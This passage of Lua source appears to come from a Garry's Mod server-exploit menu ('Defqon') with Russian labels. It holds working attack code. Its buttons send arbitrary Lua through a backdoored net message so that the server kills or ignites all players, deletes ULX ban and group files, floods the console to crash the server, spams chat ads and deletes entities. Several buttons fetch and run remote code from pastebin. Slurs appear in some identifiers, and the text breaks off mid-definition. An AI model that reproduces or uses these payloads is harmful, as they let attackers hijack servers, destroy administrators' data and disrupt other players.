	sound4:SetText("Smash Mouth OVER9000 BASS (-уши)")
	sound4:SetTextColor(Color(255, 255, 255, 255))
	sound4.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	sound4.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
	iZNX.NetStart(thefrenchenculer)
	net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/6377.mp3\", \"mono\", function()end )]])" )
	net.WriteBit(1)
	net.SendToServer()
	end
	local sound5 = vgui.Create("DButton", DScrollPanel)
	sound5:SetSize( 208, 20 )
	sound5:SetPos( 2, 100 )
	sound5:SetText("Gucci Gang But Im Screaming")
	sound5:SetTextColor(Color(255, 255, 255, 255))
	sound5.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	sound5.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
	iZNX.NetStart(thefrenchenculer)
	net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/68o4.mp3\", \"mono\", function()end )]])" )
	net.WriteBit(1)
	net.SendToServer()
	end
	end
	-------------------------------------------------------------------------------------
	function iZNX.HTXBackdoor( parent, x, y, btext )
	if !parent:IsValid() then return end
	local TButton = vgui.Create( "DButton" )
	TButton:SetParent( parent )
	TButton:SetPos( x, y )
	TButton:SetText( btext )
	TButton:SetTextColor( Color(255, 255, 255, 255) )
	TButton:SizeToContents()
	TButton:SetTall( 24 )
	TButton.Paint = function( self, w, h )
	surface.SetDrawColor( Color(100, 60, 60, 200) )
	surface.DrawRect( 0, 0, w, h )
	surface.SetDrawColor( Color( 60, 60, 60 ) )
	surface.SetMaterial( downgrad )
	surface.DrawTexturedRect( 0, 0, w, h/ 2 )
	surface.SetDrawColor( Color(100, 100, 100, 255) )
	surface.DrawOutlinedRect( 0, 0, w, h )
	surface.SetDrawColor( Color(110, 70, 70, 255) )
	surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
	end
	TButton.DoClick = function()
	iZNX.HTXCommandeListe()
	end
	return TButton:GetWide(), TButton:GetTall()
	end
	function iZNX.HTXCommandeListe()
	if iZNX.HTXCommandeSelector and iZNX.HTXCommandeSelector:IsVisible() then iZNX.HTXCommandeSelector:Remove() end
	iZNX.HTXCommandeSelector = vgui.Create("DFrame")
	iZNX.HTXCommandeSelector:SetSize(240,350)
	iZNX.HTXCommandeSelector:SetTitle("Дефкон макросы")
	iZNX.HTXCommandeSelector:SetPos( gui.MouseX(), gui.MouseY() )
	iZNX.HTXCommandeSelector:MakePopup()
	iZNX.HTXCommandeSelector.Paint = function( s, w, h )
	if !iZNX.Menu or !iZNX.Menu:IsVisible() then s:Remove() return end
	surface.SetDrawColor( Color(30, 30, 30, 245) )
	surface.DrawRect( 0, 0, w, h )
	surface.SetDrawColor( Color(55, 55, 55, 245) )
	surface.DrawOutlinedRect( 0, 0, w, h )
	surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
	end
	local DScrollPanel = vgui.Create( "DScrollPanel", iZNX.HTXCommandeSelector )
	DScrollPanel:Dock( FILL )
	local commandnethtx1 = vgui.Create("DButton", DScrollPanel)
	commandnethtx1:SetSize( 208, 20 )
	commandnethtx1:SetPos( 2, 175 )
	commandnethtx1:SetText("Убить всех")
	commandnethtx1:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx1.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx1.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Все мертвы" )
	iZNX.NetStart(thefrenchenculer)
	net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
	net.WriteBit(1)
	net.SendToServer()
	end
	local commandnethtx2 = vgui.Create("DButton", DScrollPanel)
	commandnethtx2:SetSize( 208, 20 )
	commandnethtx2:SetPos( 2, 100 )
	commandnethtx2:SetText("Безобидное disco [не ломает ничего]")
	commandnethtx2:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx2.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx2.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Disco успешно запущено" )
	net.Start(thefrenchenculer)
	net.WriteString( "http.Fetch(\"https://pastebin.com/raw/8UVtBXVn\",function(b,l,h,c)RunString(b)end,nil)" )
	net.WriteBit(1)
	net.SendToServer()
	end 
	local commandnethtx3 = vgui.Create("DButton", DScrollPanel )
	commandnethtx3:SetSize( 208, 20 )
	commandnethtx3:SetPos( 2, 375 )
	commandnethtx3:SetText("Удалить ulx баны")
	commandnethtx3:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx3.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx3.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Удалено" )
	iZNX.NetStart(thefrenchenculer)
	net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
	net.WriteBit(1)
	net.SendToServer()
	end
	local commandnethtx4 = vgui.Create("DButton", DScrollPanel )
	commandnethtx4:SetSize( 208, 20 )
	commandnethtx4:SetPos( 2, 725 )
	commandnethtx4:SetText("Поджечь всех")
	commandnethtx4:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx4.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx4.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Поджигаем" )
	iZNX.NetStart(thefrenchenculer)
	net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(120) end" )
	net.WriteBit(1)
	net.SendToServer()
	end
	local commandnethtx5 = vgui.Create("DButton", DScrollPanel )
	commandnethtx5:SetSize( 208, 20 )
	commandnethtx5:SetPos( 2, 150 )
	commandnethtx5:SetText("Удалить ulx группы")
	commandnethtx5:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx5.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx5.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Удалено" )
	iZNX.NetStart(thefrenchenculer)
	net.WriteString( "if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end" )
	net.WriteBit(1)
	net.SendToServer()
	end
	local commandnethtx6 = vgui.Create("DButton", DScrollPanel )
	commandnethtx6:SetSize( 208, 20 )
	commandnethtx6:SetPos( 2, 50 )
	commandnethtx6:SetText("Выключить сервер")
	commandnethtx6:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx6.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx6.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Выключаем" )
	iZNX.NetStart(thefrenchenculer)
	net.WriteString("timer.Create( \"spamlolk\", 0, 0, function() for i = 1, 1000000 do MsgC(Color(math.random(255), math.random(255), math.random(255)), \"� \") end end)")
	net.WriteBit(1)
	net.SendToServer()
	end
	local commandnethtx7 = vgui.Create("DButton", DScrollPanel)
	commandnethtx7:SetSize( 208, 20 )
	commandnethtx7:SetPos( 2, 200 )
	commandnethtx7:SetText("Спам в чат")
	commandnethtx7:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx7.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	local chatrapemike = false
	commandnethtx7.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	RainbowMike = {
	"chat.AddText(Color(0,255,0), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ LEAK DEMBI � ⱣLỒЇȚ | discord.gg/BszpW92█ ▇ ▆ ▅ ▄ ▂ ▁ \")",
	"chat.AddText(Color(0,0,255), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ DEMBI � ⱣLỒЇȚ | discord.gg/BszpW92█ ▇ ▆ ▅ ▄ ▂ ▁ \")",
	"chat.AddText(Color(255,0,0), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ DEMBI � ⱣLỒЇȚ | discord.gg/BszpW92█ ▇ ▆ ▅ ▄ ▂ ▁  \")",
	"chat.AddText(Color(255,255,0), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ DEMBI � ⱣLỒЇȚ | discord.gg/BszpW92█ ▇ ▆ ▅ ▄ ▂ ▁  \")",
	"chat.AddText(Color(0,255,255), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ DEMBI � ⱣLỒЇȚ | discord.gg/BszpW92█ ▇ ▆ ▅ ▄ ▂ ▁  \")",
	"chat.AddText(Color(255,0,255), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ DEMBI � ⱣLỒЇȚ | discord.gg/BszpW92█ ▇ ▆ ▅ ▄ ▂ ▁ \")",
	}
			chatrapemike = !chatrapemike
			if( chatrapemike ) then
					timer.Create( "niggaspams", 0.0001, 0, function()
						net.Start(thefrenchenculer)
						net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([["..table.Random(RainbowMike).."]]) end " )
						net.WriteBit (1)
						net.SendToServer()
					end )
			else
					timer.Destroy( "niggaspams" )
	
					
			end
		end
	local commandnethtx8 = vgui.Create("DButton", DScrollPanel)
	commandnethtx8:SetSize( 208, 20 )
	commandnethtx8:SetPos( 2, 225 )
	commandnethtx8:SetText("Изменить всем модели")
	commandnethtx8:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx8.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx8.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Изменяем" )
	iZNX.NetStart(thefrenchenculer)
	net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetModel(\"models/editor/playerstart.mdl\") end" )
	net.WriteBit(1)
	net.SendToServer()
	end
	local commandnethtx9 = vgui.Create("DButton", DScrollPanel)
	commandnethtx9:SetSize( 208, 20 )
	commandnethtx9:SetPos( 2, 250 )
	commandnethtx9:SetText("Сломать физику")
	commandnethtx9:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx9.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx9.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Сломано" )
	net.Start(thefrenchenculer)
	net.WriteString( "RunConsoleCommand(\"sv_friction\", \"-8\")" )
	net.WriteBit(1)
	net.SendToServer()
	end
	local commandnethtx10 = vgui.Create("DButton", DScrollPanel)
	commandnethtx10:SetSize( 208, 20 )
	commandnethtx10:SetPos( 2, 275 )
	commandnethtx10:SetText("Обратная гравитация")
	commandnethtx10:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx10.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx10.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Бах" )
	net.Start(thefrenchenculer)
	net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"-600\")" )
	net.WriteBit(1)
	net.SendToServer()
	end
	local commandnethtx11 = vgui.Create("DButton", DScrollPanel)
	commandnethtx11:SetSize( 208, 20 )
	commandnethtx11:SetPos( 2, 300 )
	commandnethtx11:SetText("Сбросить все деньги")
	commandnethtx11:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx11.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx11.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Сброшено" )
	net.Start(thefrenchenculer)
	net.WriteString( "RunConsoleCommand(\"rp_resetallmoney\")" )
	net.WriteBit(1)
	net.SendToServer()
	end
	local commandnethtx12 = vgui.Create("DButton", DScrollPanel)
	commandnethtx12:SetSize( 208, 20 )
	commandnethtx12:SetPos( 2, 325 )
	commandnethtx12:SetText("Запустить всех в воздух")
	commandnethtx12:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx12.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx12.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Ухуу" )
	net.Start(thefrenchenculer)
	net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
	net.WriteBit(1)
	net.SendToServer()
	end
	local commandnethtx13 = vgui.Create("DButton", DScrollPanel)
	commandnethtx13:SetSize( 208, 20 )
	commandnethtx13:SetPos( 2, 350 )
	commandnethtx13:SetText("Изменить всем имена")
	commandnethtx13:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx13.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx13.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Изменено" )
	net.Start(thefrenchenculer)
	net.WriteString( "for k, v in pairs(player.GetAll()) do v:ConCommand(\"say /name Hacked kuskom govan!\"); end" ) -- net.WriteString( "for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end" )
	net.WriteBit(1)
	net.SendToServer()
	end
	local commandnethtx14 = vgui.Create("DButton", DScrollPanel)
	commandnethtx14:SetSize( 208, 20 )
	commandnethtx14:SetPos( 2, 75 )
	commandnethtx14:SetText("Сломать сервер [disco]")
	commandnethtx14:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx14.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx14.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
	net.Start(thefrenchenculer)
	net.WriteString( "http.Fetch(\"https://pastebin.com/raw/W529HLVb\",function(b,l,h,c)RunString(b)end,nil)" )
	net.WriteBit(1)
	net.SendToServer()
	end
	local commandnethtx15 = vgui.Create("DButton", DScrollPanel)
	commandnethtx15:SetSize( 208, 20 )
	commandnethtx15:SetPos( 2, 400 )
	commandnethtx15:SetText("Сломать Экономику")
	commandnethtx15:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx15.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx15.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Сломано" )
	net.Start(thefrenchenculer)
	net.WriteString( "for k,v in pairs(player.GetAll()) do v:addMoney(99999999999999999) end" )
	net.WriteBit(1)
	net.SendToServer()
	end
	local commandnethtx16 = vgui.Create("DButton", DScrollPanel)
	commandnethtx16:SetSize( 208, 20 )
	commandnethtx16:SetPos( 2, 425 )
	commandnethtx16:SetText("Порно звуки шагов")
	commandnethtx16:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx16.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx16.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Ах" )
	net.Start(thefrenchenculer)
	net.WriteString( "hook.Add(\"PlayerFootstep\", \"porn\", function(ply, pos, foot, sound2, volume, filter) ply:EmitSound( \"vo/npc/female01/pain06.wav\",75,math.random( 50, 150 )) end )" )
	net.WriteBit(1)
	net.SendToServer()
	end
	local commandnethtx17 = vgui.Create("DButton", DScrollPanel)
	commandnethtx17:SetSize( 208, 20 )
	commandnethtx17:SetPos( 2, 450 )
	commandnethtx17:SetText("☢ Удалить все энтити ☢")
	commandnethtx17:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx17.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx17.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Удалено" )
	net.Start(thefrenchenculer)
	net.WriteString( "for k, v in pairs(ents.FindByClass( \"prop_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"func_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"env_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"lua_run*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"point_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"trigger_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"info_*\" )) do v:Remove() end" )
	net.WriteBit(1)
	net.SendToServer()
	end
	local commandnethtx18 = vgui.Create("DButton", DScrollPanel)
	commandnethtx18:SetSize( 208, 20 )
	commandnethtx18:SetPos( 2, 475 )
	commandnethtx18:SetText("HELL")
	commandnethtx18:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx18.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx18.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "hellstart/hellend" )
	net.Start(thefrenchenculer)
	net.WriteString( "http.Fetch(\"https://pastebin.com/raw/LH4NW5yc\",RunString)" )
	net.WriteBit(1)
	net.SendToServer()
	end
	local commandnethtx19 = vgui.Create("DButton", DScrollPanel)
	commandnethtx19:SetSize( 208, 20 )
	commandnethtx19:SetPos( 2, 500 )
	commandnethtx19:SetText("-Уши у всех игроков")
	commandnethtx19:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx19.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx19.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "-уши" )
	net.Start(thefrenchenculer)
	net.WriteString( "for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end" )
	net.WriteBit(1)
	net.SendToServer()
	end
	local commandnethtx20 = vgui.Create("DButton", DScrollPanel)
	commandnethtx20:SetSize( 208, 20 )
	commandnethtx20:SetPos( 2, 525 )
	commandnethtx20:SetText("Землетрясение")
	commandnethtx20:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx20.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx20.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
	net.Start(thefrenchenculer)
	net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10, 5, 60, 5000 )]] ) end" )
	net.WriteBit(1)
	net.SendToServer()
	end
	local commandnethtx21 = vgui.Create("DButton", DScrollPanel)
	commandnethtx21:SetSize( 208, 20 )
	commandnethtx21:SetPos( 2, 550 )
	commandnethtx21:SetText("2D модели")
	commandnethtx21:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx21.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx21.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Бах" )
	net.Start(thefrenchenculer)
	net.WriteString([[
		for k,v in pairs(player.GetAll()) do 
		local a = v:LookupBone("ValveBiped.Bip01_Head1")
		local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
		local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
		local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
		local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
		local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
		local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
		local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
		local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
		local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
		local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")
	
			v:ManipulateBoneScale( a, Vector(4,0,4)) 
			v:ManipulateBoneScale( b, Vector(0,0,0))
			v:ManipulateBoneScale( c, Vector(0,0,0))
			v:ManipulateBoneScale( d, Vector(0,0,1))
			v:ManipulateBoneScale( e, Vector(0,0,1))
			v:ManipulateBoneScale( f, Vector(0,0,0))
			v:ManipulateBoneScale( g, Vector(0,0,0))
			v:ManipulateBoneScale( h, Vector(1,1.5,1.5))
			v:ManipulateBoneScale( i, Vector(1,1.5,1.5))
			v:ManipulateBoneScale( j, Vector(0,0,0))
			v:ManipulateBoneScale( k, Vector(0,0,0))
			end]])
	net.WriteBit(1)
	net.SendToServer()
	end
	local commandnethtx22 = vgui.Create("DButton", DScrollPanel)
	commandnethtx22:SetSize( 208, 20 )
	commandnethtx22:SetPos( 2, 575 )
	commandnethtx22:SetText("Армагеддон")
	commandnethtx22:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx22.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx22.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Запускаем" )
	local armageddon = [[
				hook.Add("Think", "armageddon", function()
					local explode = ents.Create( "env_explosion" ) 
						explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) ) 
						explode:Spawn() 
						explode:SetKeyValue( "iMagnitude", "500" ) 
						explode:Fire( "Explode", 0, 0 ) 
					end)  
	]]
	net.Start(thefrenchenculer)
	net.WriteString( armageddon )
	net.WriteBit(1)
	net.SendToServer()
	end
	local commandnethtx23 = vgui.Create("DButton", DScrollPanel)
	commandnethtx23:SetSize( 208, 20 )
	commandnethtx23:SetPos( 2, 600 )
	commandnethtx23:SetText("Сделать всех гигантами")
	commandnethtx23:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx23.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx23.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Все стали гигантами" )
	local giant = [[
	hook.Add("Think", "giant", function()
		for k,v in pairs (player.GetAll()) do
			v:SetModelScale(2.5, 100);
			v:SetRunSpeed(400 * 2);
			v:SetWalkSpeed(200 * 2);
		end
	end)]]
	net.Start(thefrenchenculer)
	net.WriteString( giant )
	net.WriteBit(1)
	net.SendToServer()
	end
	local commandnethtx24 = vgui.Create("DButton", DScrollPanel)
	commandnethtx24:SetSize( 208, 20 )
	commandnethtx24:SetPos( 2, 625 )
	commandnethtx24:SetText("Сделать всех высокими")
	commandnethtx24:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx24.Paint = function(panel, w, h)
	surface.SetDrawColor(100, 100, 100 ,255)
	surface.DrawOutlinedRect(0, 0, w, h)
	surface.SetDrawColor(50, 0, 0 ,155)
	surface.DrawRect(0, 0, w, h)
	end
	commandnethtx24.DoClick = function()
	surface.PlaySound("garrysmod/ui_click.wav")
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Все стали высокими" )
	local tall = [[
	hook.Add("Think", "tall", function()
		for k,v in pairs (player.GetAll()) do
			v:SetModelScale(0.2, 80);
			v:SetRunSpeed(400 * 2);
			v:SetWalkSpeed(200 * 2);
		end
	end)]]
	net.Start(thefrenchenculer)
	net.WriteString( tall )
	net.WriteBit(1)
	net.SendToServer()
	end
	local commandnethtx25 = vgui.Create("DButton", DScrollPanel)
	commandnethtx25:SetSize( 208, 20 )
	commandnethtx25:SetPos( 2, 650 )
	commandnethtx25:SetText("SpeedHack")
	commandnethtx25:SetTextColor(Color(255, 255, 255, 255))
	commandnethtx25.Paint = function(panel, w, h)
